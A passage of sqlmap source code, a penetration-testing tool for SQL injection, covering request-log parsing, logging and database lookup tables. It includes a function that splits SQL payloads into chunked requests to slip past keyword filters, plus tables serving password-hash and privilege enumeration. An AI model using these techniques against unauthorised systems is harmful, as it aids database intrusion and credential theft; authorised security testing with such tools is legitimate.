\"%s:%d\" % (host, int(port)))\n                    reqResList.append(request)\n            else:\n                reqResList = [content]\n        else:\n            reqResList = re.finditer(BURP_REQUEST_REGEX, content, re.I | re.S)\n\n        for match in reqResList:\n            request = match if isinstance(match, six.string_types) else match.group(1)\n            request = re.sub(r\"\\A[^\\w]+\", \"\", request)\n            schemePort = re.search(r\"(http[\\w]*)\\:\\/\\/.*?\\:([\\d]+).+?={10,}\", request, re.I | re.S)\n\n            if schemePort:\n                scheme = schemePort.group(1)\n                port = schemePort.group(2)\n                request = re.sub(r\"\\n=+\\Z\", \"\", request.split(schemePort.group(0))[-1].lstrip())\n            else:\n                scheme, port = None, None\n\n            if \"HTTP/\" not in request:\n                continue\n\n            if re.search(r\"^[\\n]*%s[^?]*?\\.(%s)\\sHTTP\\/\" % (HTTPMETHOD.GET, \"|\".join(CRAWL_EXCLUDE_EXTENSIONS)), request, re.I | re.M):\n                if not re.search(r\"^[\\n]*%s[^\\n]*\\*[^\\n]*\\sHTTP\\/\" % HTTPMETHOD.GET, request, re.I | re.M):\n                    continue\n\n            getPostReq = False\n            forceBody = False\n            url = None\n            host = None\n            method = None\n            data = None\n            cookie = None\n            params = False\n            newline = None\n            lines = request.split('\\n')\n            headers = []\n\n            for index in xrange(len(lines)):\n                line = lines[index]\n\n                if not line.strip() and index == len(lines) - 1:\n                    break\n\n                line = re.sub(INJECT_HERE_REGEX, CUSTOM_INJECTION_MARK_CHAR, line)\n\n                newline = \"\\r\\n\" if line.endswith('\\r') else '\\n'\n                line = line.strip('\\r')\n                match = re.search(r\"\\A([A-Z]+) (.+) HTTP/[\\d.]+\\Z\", line) if not method else None\n\n                if len(line.strip()) == 0 and method and (method != HTTPMETHOD.GET or forceBody) and data is None:\n                    data = \"\"\n                    params = True\n\n                elif match:\n                    method = match.group(1)\n                    url = match.group(2)\n\n                    if any(_ in line for _ in ('?', '=', kb.customInjectionMark)):\n                        params = True\n\n                    getPostReq = True\n\n                # POST parameters\n                elif data is not None and params:\n                    data += \"%s%s\" % (line, newline)\n\n                # GET parameters\n                elif \"?\" in line and \"=\" in line and \": \" not in line:\n                    params = True\n\n                # Headers\n                elif re.search(r\"\\A\\S+:\", line):\n                    key, value = line.split(\":\", 1)\n                    value = value.strip().replace(\"\\r\", \"\").replace(\"\\n\", \"\")\n\n                    # Note: overriding values with --headers '...'\n                    match = re.search(r\"(?i)\\b(%s): ([^\\n]*)\" % re.escape(key), conf.headers or \"\")\n                    if match:\n                        key, value = match.groups()\n\n                    # Cookie and Host headers\n                    if key.upper() == HTTP_HEADER.COOKIE.upper():\n                        cookie = value\n                    elif key.upper() == HTTP_HEADER.HOST.upper():\n                        if '://' in value:\n                            scheme, value = value.split('://')[:2]\n\n                        port = extractRegexResult(r\":(?P<result>\\d+)\\Z\", value)\n                        if port:\n                            value = value[:-(1 + len(port))]\n\n                        host = value\n\n                    # Avoid to add a static content length header to\n                    # headers and consider the following lines as\n                    # POSTed data\n                    if key.upper() == HTTP_HEADER.CONTENT_LENGTH.upper():\n                        forceBody = True\n                        params = True\n\n                    # Avoid proxy and connection type related headers\n                    elif key not in (HTTP_HEADER.PROXY_CONNECTION, HTTP_HEADER.CONNECTION, HTTP_HEADER.IF_MODIFIED_SINCE, HTTP_HEADER.IF_NONE_MATCH):\n                        headers.append((getUnicode(key), getUnicode(value)))\n\n                    if kb.customInjectionMark in re.sub(PROBLEMATIC_CUSTOM_INJECTION_PATTERNS, \"\", value or \"\"):\n                        params = True\n\n            data = data.rstrip(\"\\r\\n\") if data else data\n\n            if getPostReq and (params or cookie or not checkParams):\n                if not port and hasattr(scheme, \"lower\") and scheme.lower() == \"https\":\n                    port = \"443\"\n                elif not scheme and port == \"443\":\n                    scheme = \"https\"\n\n                if conf.forceSSL:\n                    scheme = \"https\"\n                    port = port or \"443\"\n\n                if not host:\n                    errMsg = \"invalid format of a request file\"\n                    raise SqlmapSyntaxException(errMsg)\n\n                if not url.startswith(\"http\"):\n                    url = \"%s://%s:%s%s\" % (scheme or \"http\", host, port or \"80\", url)\n                    scheme = None\n                    port = None\n\n                if not(conf.scope and not re.search(conf.scope, url, re.I)):\n                    yield (url, conf.method or method, data, cookie, tuple(headers))\n\n    content = readCachedFileContent(reqFile)\n\n    if conf.scope:\n        logger.info(\"using regular expression '%s' for filtering targets\" % conf.scope)\n\n        try:\n            re.compile(conf.scope)\n        except Exception as ex:\n            errMsg = \"invalid regular expression '%s' ('%s')\" % (conf.scope, getSafeExString(ex))\n            raise SqlmapSyntaxException(errMsg)\n\n    for target in _parseBurpLog(content):\n        yield target\n\n    for target in _parseWebScarabLog(content):\n        yield target\n\ndef getSafeExString(ex, encoding=None):\n    \"\"\"\n    Safe way how to get the proper exception represtation as a string\n\n    >>> getSafeExString(SqlmapBaseException('foobar')) == 'foobar'\n    True\n    >>> getSafeExString(OSError(0, 'foobar')) == 'OSError: foobar'\n    True\n    \"\"\"\n\n    retVal = None\n\n    if getattr(ex, \"message\", None):\n        retVal = ex.message\n    elif getattr(ex, \"msg\", None):\n        retVal = ex.msg\n    elif getattr(ex, \"args\", None):\n        for candidate in ex.args[::-1]:\n            if isinstance(candidate, six.string_types):\n                retVal = candidate\n                break\n\n    if retVal is None:\n        retVal = str(ex)\n    elif not isinstance(ex, SqlmapBaseException):\n        retVal = \"%s: %s\" % (type(ex).__name__, retVal)\n\n    return getUnicode(retVal or \"\", encoding=encoding).strip()\n\ndef safeVariableNaming(value):\n    \"\"\"\n    Returns escaped safe-representation of a given variable name that can be used in Python evaluated code\n\n    >>> safeVariableNaming(\"class.id\") == \"EVAL_636c6173732e6964\"\n    True\n    \"\"\"\n\n    if value in keyword.kwlist or re.search(r\"\\A[^a-zA-Z]|[^\\w]\", value):\n        value = \"%s%s\" % (EVALCODE_ENCODED_PREFIX, getUnicode(binascii.hexlify(getBytes(value))))\n\n    return value\n\ndef unsafeVariableNaming(value):\n    \"\"\"\n    Returns unescaped safe-representation of a given variable name\n\n    >>> unsafeVariableNaming(\"EVAL_636c6173732e6964\") == \"class.id\"\n    True\n    \"\"\"\n\n    if value.startswith(EVALCODE_ENCODED_PREFIX):\n        value = decodeHex(value[len(EVALCODE_ENCODED_PREFIX):], binary=False)\n\n    return value\n\ndef firstNotNone(*args):\n    \"\"\"\n    Returns first not-None value from a given list of arguments\n\n    >>> firstNotNone(None, None, 1, 2, 3)\n    1\n    \"\"\"\n\n    retVal = None\n\n    for _ in args:\n        if _ is not None:\n            retVal = _\n            break\n\n    return retVal\n\ndef removePostHintPrefix(value):\n    \"\"\"\n    Remove POST hint prefix from a given value (name)\n\n    >>> removePostHintPrefix(\"JSON id\")\n    'id'\n    >>> removePostHintPrefix(\"id\")\n    'id'\n    \"\"\"\n\n    return re.sub(r\"\\A(%s) \" % '|'.join(re.escape(__) for __ in getPublicTypeMembers(POST_HINT, onlyValues=True)), \"\", value)\n\ndef chunkSplitPostData(data):\n    \"\"\"\n    Convert POST data to chunked transfer-encoded data (Note: splitting done by SQL keywords)\n\n    >>> random.seed(0)\n    >>> chunkSplitPostData(\"SELECT username,password FROM users\")\n    '5;4Xe90\\\\r\\\\nSELEC\\\\r\\\\n3;irWlc\\\\r\\\\nT u\\\\r\\\\n1;eT4zO\\\\r\\\\ns\\\\r\\\\n5;YB4hM\\\\r\\\\nernam\\\\r\\\\n9;2pUD8\\\\r\\\\ne,passwor\\\\r\\\\n3;mp07y\\\\r\\\\nd F\\\\r\\\\n5;8RKXi\\\\r\\\\nROM u\\\\r\\\\n4;MvMhO\\\\r\\\\nsers\\\\r\\\\n0\\\\r\\\\n\\\\r\\\\n'\n    \"\"\"\n\n    length = len(data)\n    retVal = \"\"\n    index = 0\n\n    while index < length:\n        chunkSize = randomInt(1)\n\n        if index + chunkSize >= length:\n            chunkSize = length - index\n\n        salt = randomStr(5, alphabet=string.ascii_letters + string.digits)\n\n        while chunkSize:\n            candidate = data[index:index + chunkSize]\n\n            if re.search(r\"\\b%s\\b\" % '|'.join(HTTP_CHUNKED_SPLIT_KEYWORDS), candidate, re.I):\n                chunkSize -= 1\n            else:\n                break\n\n        index += chunkSize\n        retVal += \"%x;%s\\r\\n\" % (chunkSize, salt)\n        retVal += \"%s\\r\\n\" % candidate\n\n    retVal += \"0\\r\\n\\r\\n\"\n\n    return retVal\n\ndef checkSums():\n    \"\"\"\n    Validate the content of the digest file (i.e. sha256sums.txt)\n    >>> checkSums()\n    True\n    \"\"\"\n\n    retVal = True\n\n    if paths.get(\"DIGEST_FILE\"):\n        for entry in getFileItems(paths.DIGEST_FILE):\n            match = re.search(r\"([0-9a-f]+)\\s+([^\\s]+)\", entry)\n            if match:\n                expected, filename = match.groups()\n                filepath = os.path.join(paths.SQLMAP_ROOT_PATH, filename).replace('/', os.path.sep)\n                checkFile(filepath)\n                with open(filepath, \"rb\") as f:\n                    content = f.read()\n                if not hashlib.sha256(content).hexdigest() == expected:\n                    retVal &= False\n                    break\n\n    return retVal\n", "lib/core/log.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport logging\nimport re\nimport sys\n\nfrom lib.core.enums import CUSTOM_LOGGING\n\nlogging.addLevelName(CUSTOM_LOGGING.PAYLOAD, \"PAYLOAD\")\nlogging.addLevelName(CUSTOM_LOGGING.TRAFFIC_OUT, \"TRAFFIC OUT\")\nlogging.addLevelName(CUSTOM_LOGGING.TRAFFIC_IN, \"TRAFFIC IN\")\n\nLOGGER = logging.getLogger(\"sqlmapLog\")\n\nLOGGER_HANDLER = None\ntry:\n    from thirdparty.ansistrm.ansistrm import ColorizingStreamHandler\n\n    class _ColorizingStreamHandler(ColorizingStreamHandler):\n        def colorize(self, message, levelno, force=False):\n            if levelno in self.level_map and (self.is_tty or force):\n                bg, fg, bold = self.level_map[levelno]\n                params = []\n\n                if bg in self.color_map:\n                    params.append(str(self.color_map[bg] + 40))\n\n                if fg in self.color_map:\n                    params.append(str(self.color_map[fg] + 30))\n\n                if bold:\n                    params.append('1')\n\n                if params and message:\n                    match = re.search(r\"\\A(\\s+)\", message)\n                    prefix = match.group(1) if match else \"\"\n                    message = message[len(prefix):]\n\n                    match = re.search(r\"\\[([A-Z ]+)\\]\", message)  # log level\n                    if match:\n                        level = match.group(1)\n                        if message.startswith(self.bold):\n                            message = message.replace(self.bold, \"\")\n                            reset = self.reset + self.bold\n                            params.append('1')\n                        else:\n                            reset = self.reset\n                        message = message.replace(level, ''.join((self.csi, ';'.join(params), 'm', level, reset)), 1)\n\n                        match = re.search(r\"\\A\\s*\\[([\\d:]+)\\]\", message)  # time\n                        if match:\n                            time = match.group(1)\n                            message = message.replace(time, ''.join((self.csi, str(self.color_map[\"cyan\"] + 30), 'm', time, self._reset(message))), 1)\n\n                        match = re.search(r\"\\[(#\\d+)\\]\", message)  # counter\n                        if match:\n                            counter = match.group(1)\n                            message = message.replace(counter, ''.join((self.csi, str(self.color_map[\"yellow\"] + 30), 'm', counter, self._reset(message))), 1)\n\n                        if level != \"PAYLOAD\":\n                            if any(_ in message for _ in (\"parsed DBMS error message\",)):\n                                match = re.search(r\": '(.+)'\", message)\n                                if match:\n                                    string = match.group(1)\n                                    message = message.replace(\"'%s'\" % string, \"'%s'\" % ''.join((self.csi, str(self.color_map[\"white\"] + 30), 'm', string, self._reset(message))), 1)\n                            else:\n                                match = re.search(r\"\\bresumed: '(.+\\.\\.\\.)\", message)\n                                if match:\n                                    string = match.group(1)\n                                    message = message.replace(\"'%s\" % string, \"'%s\" % ''.join((self.csi, str(self.color_map[\"white\"] + 30), 'm', string, self._reset(message))), 1)\n                                else:\n                                    match = re.search(r\" \\('(.+)'\\)\\Z\", message) or re.search(r\"output: '(.+)'\\Z\", message)\n                                    if match:\n                                        string = match.group(1)\n                                        message = message.replace(\"'%s'\" % string, \"'%s'\" % ''.join((self.csi, str(self.color_map[\"white\"] + 30), 'm', string, self._reset(message))), 1)\n                                    else:\n                                        for match in re.finditer(r\"[^\\w]'([^']+)'\", message):  # single-quoted\n                                            string = match.group(1)\n                                            message = message.replace(\"'%s'\" % string, \"'%s'\" % ''.join((self.csi, str(self.color_map[\"white\"] + 30), 'm', string, self._reset(message))), 1)\n                    else:\n                        message = ''.join((self.csi, ';'.join(params), 'm', message, self.reset))\n\n                    if prefix:\n                        message = \"%s%s\" % (prefix, message)\n\n                    message = message.replace(\"%s]\" % self.bold, \"]%s\" % self.bold)  # dirty patch\n\n            return message\n\n    disableColor = False\n\n    for argument in sys.argv:\n        if \"disable-col\" in argument:\n            disableColor = True\n            break\n\n    if disableColor:\n        LOGGER_HANDLER = logging.StreamHandler(sys.stdout)\n    else:\n        LOGGER_HANDLER = _ColorizingStreamHandler(sys.stdout)\n        LOGGER_HANDLER.level_map[logging.getLevelName(\"PAYLOAD\")] = (None, \"cyan\", False)\n        LOGGER_HANDLER.level_map[logging.getLevelName(\"TRAFFIC OUT\")] = (None, \"magenta\", False)\n        LOGGER_HANDLER.level_map[logging.getLevelName(\"TRAFFIC IN\")] = (\"magenta\", None, False)\nexcept ImportError:\n    LOGGER_HANDLER = logging.StreamHandler(sys.stdout)\n\nFORMATTER = logging.Formatter(\"\\r[%(asctime)s] [%(levelname)s] %(message)s\", \"%H:%M:%S\")\n\nLOGGER_HANDLER.setFormatter(FORMATTER)\nLOGGER.addHandler(LOGGER_HANDLER)\nLOGGER.setLevel(logging.INFO)\n", "lib/core/dicts.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import CONTENT_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import OS\nfrom lib.core.enums import POST_HINT\nfrom lib.core.settings import ACCESS_ALIASES\nfrom lib.core.settings import ALTIBASE_ALIASES\nfrom lib.core.settings import BLANK\nfrom lib.core.settings import CACHE_ALIASES\nfrom lib.core.settings import CRATEDB_ALIASES\nfrom lib.core.settings import CUBRID_ALIASES\nfrom lib.core.settings import DB2_ALIASES\nfrom lib.core.settings import DERBY_ALIASES\nfrom lib.core.settings import EXTREMEDB_ALIASES\nfrom lib.core.settings import FIREBIRD_ALIASES\nfrom lib.core.settings import FRONTBASE_ALIASES\nfrom lib.core.settings import H2_ALIASES\nfrom lib.core.settings import HSQLDB_ALIASES\nfrom lib.core.settings import INFORMIX_ALIASES\nfrom lib.core.settings import MAXDB_ALIASES\nfrom lib.core.settings import MCKOI_ALIASES\nfrom lib.core.settings import MIMERSQL_ALIASES\nfrom lib.core.settings import MONETDB_ALIASES\nfrom lib.core.settings import MSSQL_ALIASES\nfrom lib.core.settings import MYSQL_ALIASES\nfrom lib.core.settings import NULL\nfrom lib.core.settings import ORACLE_ALIASES\nfrom lib.core.settings import PGSQL_ALIASES\nfrom lib.core.settings import PRESTO_ALIASES\nfrom lib.core.settings import RAIMA_ALIASES\nfrom lib.core.settings import SQLITE_ALIASES\nfrom lib.core.settings import SYBASE_ALIASES\nfrom lib.core.settings import VERTICA_ALIASES\nfrom lib.core.settings import VIRTUOSO_ALIASES\nfrom lib.core.settings import CLICKHOUSE_ALIASES\n\nFIREBIRD_TYPES = {\n    261: \"BLOB\",\n    14: \"CHAR\",\n    40: \"CSTRING\",\n    11: \"D_FLOAT\",\n    27: \"DOUBLE\",\n    10: \"FLOAT\",\n    16: \"INT64\",\n    8: \"INTEGER\",\n    9: \"QUAD\",\n    7: \"SMALLINT\",\n    12: \"DATE\",\n    13: \"TIME\",\n    35: \"TIMESTAMP\",\n    37: \"VARCHAR\",\n}\n\nINFORMIX_TYPES = {\n    0: \"CHAR\",\n    1: \"SMALLINT\",\n    2: \"INTEGER\",\n    3: \"FLOAT\",\n    4: \"SMALLFLOAT\",\n    5: \"DECIMAL\",\n    6: \"SERIAL\",\n    7: \"DATE\",\n    8: \"MONEY\",\n    9: \"NULL\",\n    10: \"DATETIME\",\n    11: \"BYTE\",\n    12: \"TEXT\",\n    13: \"VARCHAR\",\n    14: \"INTERVAL\",\n    15: \"NCHAR\",\n    16: \"NVARCHAR\",\n    17: \"INT8\",\n    18: \"SERIAL8\",\n    19: \"SET\",\n    20: \"MULTISET\",\n    21: \"LIST\",\n    22: \"ROW (unnamed)\",\n    23: \"COLLECTION\",\n    40: \"Variable-length opaque type\",\n    41: \"Fixed-length opaque type\",\n    43: \"LVARCHAR\",\n    45: \"BOOLEAN\",\n    52: \"BIGINT\",\n    53: \"BIGSERIAL\",\n    2061: \"IDSSECURITYLABEL\",\n    4118: \"ROW (named)\",\n}\n\nSYBASE_TYPES = {\n    14: \"floatn\",\n    8: \"float\",\n    15: \"datetimn\",\n    12: \"datetime\",\n    23: \"real\",\n    28: \"numericn\",\n    10: \"numeric\",\n    27: \"decimaln\",\n    26: \"decimal\",\n    17: \"moneyn\",\n    11: \"money\",\n    21: \"smallmoney\",\n    22: \"smalldatetime\",\n    13: \"intn\",\n    7: \"int\",\n    6: \"smallint\",\n    5: \"tinyint\",\n    16: \"bit\",\n    2: \"varchar\",\n    18: \"sysname\",\n    25: \"nvarchar\",\n    1: \"char\",\n    24: \"nchar\",\n    4: \"varbinary\",\n    80: \"timestamp\",\n    3: \"binary\",\n    19: \"text\",\n    20: \"image\",\n}\n\nALTIBASE_TYPES = {\n    1: \"CHAR\",\n    12: \"VARCHAR\",\n    -8: \"NCHAR\",\n    -9: \"NVARCHAR\",\n    2: \"NUMERIC\",\n    6: \"FLOAT\",\n    8: \"DOUBLE\",\n    7: \"REAL\",\n    -5: \"BIGINT\",\n    4: \"INTEGER\",\n    5: \"SMALLINT\",\n    9: \"DATE\",\n    30: \"BLOB\",\n    40: \"CLOB\",\n    20001: \"BYTE\",\n    20002: \"NIBBLE\",\n    -7: \"BIT\",\n    -100: \"VARBIT\",\n    10003: \"GEOMETRY\",\n}\n\nMYSQL_PRIVS = {\n    1: \"select_priv\",\n    2: \"insert_priv\",\n    3: \"update_priv\",\n    4: \"delete_priv\",\n    5: \"create_priv\",\n    6: \"drop_priv\",\n    7: \"reload_priv\",\n    8: \"shutdown_priv\",\n    9: \"process_priv\",\n    10: \"file_priv\",\n    11: \"grant_priv\",\n    12: \"references_priv\",\n    13: \"index_priv\",\n    14: \"alter_priv\",\n    15: \"show_db_priv\",\n    16: \"super_priv\",\n    17: \"create_tmp_table_priv\",\n    18: \"lock_tables_priv\",\n    19: \"execute_priv\",\n    20: \"repl_slave_priv\",\n    21: \"repl_client_priv\",\n    22: \"create_view_priv\",\n    23: \"show_view_priv\",\n    24: \"create_routine_priv\",\n    25: \"alter_routine_priv\",\n    26: \"create_user_priv\",\n}\n\nPGSQL_PRIVS = {\n    1: \"createdb\",\n    2: \"super\",\n    3: \"catupd\",\n}\n\n# Reference(s): http://stackoverflow.com/a/17672504\n#               http://docwiki.embarcadero.com/InterBase/XE7/en/RDB$USER_PRIVILEGES\n\nFIREBIRD_PRIVS = {\n    \"S\": \"SELECT\",\n    \"I\": \"INSERT\",\n    \"U\": \"UPDATE\",\n    \"D\": \"DELETE\",\n    \"R\": \"REFERENCE\",\n    \"X\": \"EXECUTE\",\n    \"A\": \"ALL\",\n    \"M\": \"MEMBER\",\n    \"T\": \"DECRYPT\",\n    \"E\": \"ENCRYPT\",\n    \"B\": \"SUBSCRIBE\",\n}\n\n# Reference(s): https://www.ibm.com/support/knowledgecenter/SSGU8G_12.1.0/com.ibm.sqls.doc/ids_sqs_0147.htm\n#               https://www.ibm.com/support/knowledgecenter/SSGU8G_11.70.0/com.ibm.sqlr.doc/ids_sqr_077.htm\n\nINFORMIX_PRIVS = {\n    \"D\": \"DBA (all privileges)\",\n    \"R\": \"RESOURCE (create UDRs, UDTs, permanent tables and indexes)\",\n    \"C\": \"CONNECT (work with existing tables)\",\n    \"G\": \"ROLE\",\n    \"U\": \"DEFAULT (implicit connection)\",\n}\n\nDB2_PRIVS = {\n    1: \"CONTROLAUTH\",\n    2: \"ALTERAUTH\",\n    3: \"DELETEAUTH\",\n    4: \"INDEXAUTH\",\n    5: \"INSERTAUTH\",\n    6: \"REFAUTH\",\n    7: \"SELECTAUTH\",\n    8: \"UPDATEAUTH\",\n}\n\nDUMP_REPLACEMENTS = {\" \": NULL, \"\": BLANK}\n\nDBMS_DICT = {\n    DBMS.MSSQL: (MSSQL_ALIASES, \"python-pymssql\", \"https://github.com/pymssql/pymssql\", \"mssql+pymssql\"),\n    DBMS.MYSQL: (MYSQL_ALIASES, \"python-pymysql\", \"https://github.com/PyMySQL/PyMySQL\", \"mysql\"),\n    DBMS.PGSQL: (PGSQL_ALIASES, \"python-psycopg2\", \"https://github.com/psycopg/psycopg2\", \"postgresql\"),\n    DBMS.ORACLE: (ORACLE_ALIASES, \"python cx_Oracle\", \"https://oracle.github.io/python-cx_Oracle/\", \"oracle\"),\n    DBMS.SQLITE: (SQLITE_ALIASES, \"python-sqlite\", \"https://docs.python.org/3/library/sqlite3.html\", \"sqlite\"),\n    DBMS.ACCESS: (ACCESS_ALIASES, \"python-pyodbc\", \"https://github.com/mkleehammer/pyodbc\", \"access\"),\n    DBMS.FIREBIRD: (FIREBIRD_ALIASES, \"python-kinterbasdb\", \"http://kinterbasdb.sourceforge.net/\", \"firebird\"),\n    DBMS.MAXDB: (MAXDB_ALIASES, None, None, \"maxdb\"),\n    DBMS.SYBASE: (SYBASE_ALIASES, \"python-pymssql\", \"https://github.com/pymssql/pymssql\", \"sybase\"),\n    DBMS.DB2: (DB2_ALIASES, \"python ibm-db\", \"https://github.com/ibmdb/python-ibmdb\", \"ibm_db_sa\"),\n    DBMS.HSQLDB: (HSQLDB_ALIASES, \"python jaydebeapi & python-jpype\", \"https://pypi.python.org/pypi/JayDeBeApi/ & https://github.com/jpype-project/jpype\", None),\n    DBMS.H2: (H2_ALIASES, None, None, None),\n    DBMS.INFORMIX: (INFORMIX_ALIASES, \"python ibm-db\", \"https://github.com/ibmdb/python-ibmdb\", \"ibm_db_sa\"),\n    DBMS.MONETDB: (MONETDB_ALIASES, \"pymonetdb\", \"https://github.com/gijzelaerr/pymonetdb\", \"monetdb\"),\n    DBMS.DERBY: (DERBY_ALIASES, \"pydrda\", \"https://github.com/nakagami/pydrda/\", None),\n    DBMS.VERTICA: (VERTICA_ALIASES, \"vertica-python\", \"https://github.com/vertica/vertica-python\", \"vertica+vertica_python\"),\n    DBMS.MCKOI: (MCKOI_ALIASES, None, None, None),\n    DBMS.PRESTO: (PRESTO_ALIASES, \"presto-python-client\", \"https://github.com/prestodb/presto-python-client\", None),\n    DBMS.ALTIBASE: (ALTIBASE_ALIASES, None, None, None),\n    DBMS.MIMERSQL: (MIMERSQL_ALIASES, \"mimerpy\", \"https://github.com/mimersql/MimerPy\", None),\n    DBMS.CLICKHOUSE: (CLICKHOUSE_ALIASES, \"clickhouse_connect\", \"https://github.com/ClickHouse/clickhouse-connect\", None),\n    DBMS.CRATEDB: (CRATEDB_ALIASES, \"python-psycopg2\", \"https://github.com/psycopg/psycopg2\", \"postgresql\"),\n    DBMS.CUBRID: (CUBRID_ALIASES, \"CUBRID-Python\", \"https://github.com/CUBRID/cubrid-python\", None),\n    DBMS.CACHE: (CACHE_ALIASES, \"python jaydebeapi & python-jpype\", \"https://pypi.python.org/pypi/JayDeBeApi/ & https://github.com/jpype-project/jpype\", None),\n    DBMS.EXTREMEDB: (EXTREMEDB_ALIASES, None, None, None),\n    DBMS.FRONTBASE: (FRONTBASE_ALIASES, None, None, None),\n    DBMS.RAIMA: (RAIMA_ALIASES, None, None, None),\n    DBMS.VIRTUOSO: (VIRTUOSO_ALIASES, None, None, None),\n}\n\n# Reference: https://blog.jooq.org/tag/sysibm-sysdummy1/\nFROM_DUMMY_TABLE = {\n    DBMS.ORACLE: \" FROM DUAL\",\n    DBMS.ACCESS: \" FROM MSysAccessObjects\",\n    DBMS.FIREBIRD: \" FROM RDB$DATABASE\",\n    DBMS.MAXDB: \" FROM VERSIONS\",\n    DBMS.DB2: \" FROM SYSIBM.SYSDUMMY1\",\n    DBMS.HSQLDB: \" FROM INFORMATION_SCHEMA.SYSTEM_USERS\",\n    DBMS.INFORMIX: \" FROM SYSMASTER:SYSDUAL\",\n    DBMS.DERBY: \" FROM SYSIBM.SYSDUMMY1\",\n    DBMS.MIMERSQL: \" FROM SYSTEM.ONEROW\",\n    DBMS.FRONTBASE: \" FROM INFORMATION_SCHEMA.IO_STATISTICS\"\n}\n\nHEURISTIC_NULL_EVAL = {\n    DBMS.ACCESS: \"CVAR(NULL)\",\n    DBMS.MAXDB: \"ALPHA(NULL)\",\n    DBMS.MSSQL: \"DIFFERENCE(NULL,NULL)\",\n    DBMS.MYSQL: \"QUARTER(NULL XOR NULL)\",\n    DBMS.ORACLE: \"INSTR2(NULL,NULL)\",\n    DBMS.PGSQL: \"QUOTE_IDENT(NULL)\",\n    DBMS.SQLITE: \"UNLIKELY(NULL)\",\n    DBMS.H2: \"STRINGTOUTF8(NULL)\",\n    DBMS.MONETDB: \"CODE(NULL)\",\n    DBMS.DERBY: \"NULLIF(USER,SESSION_USER)\",\n    DBMS.VERTICA: \"BITSTRING_TO_BINARY(NULL)\",\n    DBMS.MCKOI: \"TONUMBER(NULL)\",\n    DBMS.PRESTO: \"FROM_HEX(NULL)\",\n    DBMS.ALTIBASE: \"TDESENCRYPT(NULL,NULL)\",\n    DBMS.MIMERSQL: \"ASCII_CHAR(256)\",\n    DBMS.CRATEDB: \"MD5(NULL~NULL)\",  # Note: NULL~NULL also being evaluated on H2 and Ignite\n    DBMS.CUBRID: \"(NULL SETEQ NULL)\",\n    DBMS.CACHE: \"%SQLUPPER NULL\",\n    DBMS.EXTREMEDB: \"NULLIFZERO(hashcode(NULL))\",\n    DBMS.RAIMA: \"IF(ROWNUMBER()>0,CONVERT(NULL,TINYINT),NULL))\",\n    DBMS.VIRTUOSO: \"__MAX_NOTNULL(NULL)\",\n    DBMS.CLICKHOUSE: \"halfMD5(NULL) IS NULL\",\n}\n\nSQL_STATEMENTS = {\n    \"SQL SELECT statement\": (\n        \"select \",\n        \"show \",\n        \" top \",\n        \" distinct \",\n        \" from \",\n        \" from dual\",\n        \" where \",\n        \" group by \",\n        \" order by \",\n        \" having \",\n        \" limit \",\n        \" offset \",\n        \" union all \",\n        \" rownum as \",\n        \"(case \",\n    ),\n\n    \"SQL data definition\": (\n        \"create \",\n        \"declare \",\n        \"drop \",\n        \"truncate \",\n        \"alter \",\n    ),\n\n    \"SQL data manipulation\": (\n        \"bulk \",\n        \"insert \",\n        \"update \",\n        \"delete \",\n        \"merge \",\n        \"load \",\n    ),\n\n    \"SQL data control\": (\n        \"grant \",\n        \"revoke \",\n    ),\n\n    \"SQL data execution\": (\n        \"exec \",\n        \"execute \",\n        \"values \",\n        \"call \",\n    ),\n\n    \"SQL transaction\": (\n        \"start transaction \",\n        \"begin work \",\n        \"begin transaction \",\n        \"commit \",\n        \"rollback \",\n    ),\n\n    \"SQL administration\": (\n        \"set \",\n    ),\n}\n\nPOST_HINT_CONTENT_TYPES = {\n    POST_HINT.JSON: \"application/json\",\n    POST_HINT.JSON_LIKE: \"application/json\",\n    POST_HINT.MULTIPART: \"multipart/form-data\",\n    POST_HINT.SOAP: \"application/soap+xml\",\n    POST_HINT.XML: \"application/xml\",\n    POST_HINT.ARRAY_LIKE: \"application/x-www-form-urlencoded; charset=utf-8\",\n}\n\nOBSOLETE_OPTIONS = {\n    \"--replicate\": \"use '--dump-format=SQLITE' instead\",\n    \"--no-unescape\": \"use '--no-escape' instead\",\n    \"--binary\": \"use '--binary-fields' instead\",\n    \"--auth-private\": \"use '--auth-file' instead\",\n    \"--ignore-401\": \"use '--ignore-code' instead\",\n    \"--second-order\": \"use '--second-url' instead\",\n    \"--purge-output\": \"use '--purge' instead\",\n    \"--sqlmap-shell\": \"use '--shell' instead\",\n    \"--check-payload\": None,\n    \"--check-waf\": None,\n    \"--pickled-options\": \"use '--api -c ...' instead\",\n    \"--identify-waf\": \"functionality being done automatically\",\n}\n\nDEPRECATED_OPTIONS = {\n}\n\nDUMP_DATA_PREPROCESS = {\n    DBMS.ORACLE: {\"XMLTYPE\": \"(%s).getStringVal()\"},  # Reference: https://www.tibcommunity.com/docs/DOC-3643\n    DBMS.MSSQL: {\"IMAGE\": \"CONVERT(VARBINARY(MAX),%s)\"},\n}\n\nDEFAULT_DOC_ROOTS = {\n    OS.WINDOWS: (\"C:/xampp/htdocs/\", \"C:/wamp/www/\", \"C:/Inetpub/wwwroot/\"),\n    OS.LINUX: (\"/var/www/\", \"/var/www/html\", \"/var/www/htdocs\", \"/usr/local/apache2/htdocs\", \"/usr/local/www/data\", \"/var/apache2/htdocs\", \"/var/www/nginx-default\", \"/srv/www/htdocs\", \"/usr/local/var/www\")  # Reference: https://wiki.apache.org/httpd/DistrosDefaultLayout\n}\n\nPART_RUN_CONTENT_TYPES = {\n    \"checkDbms\": CONTENT_TYPE.TECHNIQUES,\n    \"getFingerprint\": CONTENT_TYPE.DBMS_FINGERPRINT,\n    \"getBanner\": CONTENT_TYPE.BANNER,\n    \"getCurrentUser\": CONTENT_TYPE.CURRENT_USER,\n    \"getCurrentDb\": CONTENT_TYPE.CURRENT_DB,\n    \"getHostname\": CONTENT_TYPE.HOSTNAME,\n    \"isDba\": CONTENT_TYPE.IS_DBA,\n    \"getUsers\": CONTENT_TYPE.USERS,\n    \"getPasswordHashes\": CONTENT_TYPE.PASSWORDS,\n    \"getPrivileges\": CONTENT_TYPE.PRIVILEGES,\n    \"getRoles\": CONTENT_TYPE.ROLES,\n    \"getDbs\": CONTENT_TYPE.DBS,\n    \"getTables\": 